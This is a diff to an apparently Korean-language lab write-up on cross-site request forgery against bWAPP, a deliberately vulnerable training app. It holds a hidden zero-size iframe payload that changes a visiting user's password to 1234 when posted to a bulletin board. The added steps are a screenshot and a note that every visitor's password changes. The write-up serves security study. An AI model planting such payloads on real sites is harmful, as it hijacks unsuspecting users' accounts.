@@ -28,6 +28,15 @@ sort: 9
 
 method="GET" 요청방식을 사용하고 있으므로 서버로 전달할 내용이 URL에 주소에 포함된다. Change 버튼을 클릭하면 http://bee-box/`csrf_1.php?password_new=_____&password_conf=______&action=change` 형태의 요청이 서버로 전달되는것을 알수있다
 
+---
+
 **Step 2. 공격 URL을 호출하도록 게시판에 등록**
 
 `<iframe src = "http://bee-box/bWAPP/csrf_1.php?password_new=1234&password_conf=1234&action=change" width = "0" height="0"></iframe>`
+
+![csrf3](https://user-images.githubusercontent.com/76420201/107192095-865abc80-6a30-11eb-9ae8-ccd76bf8192e.jpg)
+
+
+**Step 3. 페이지에 접속하면 비밀번호가 변경 됌**
+
+해당 페이지에 접속하는 유저는 비밀번호가 1234로 바뀌게 됌
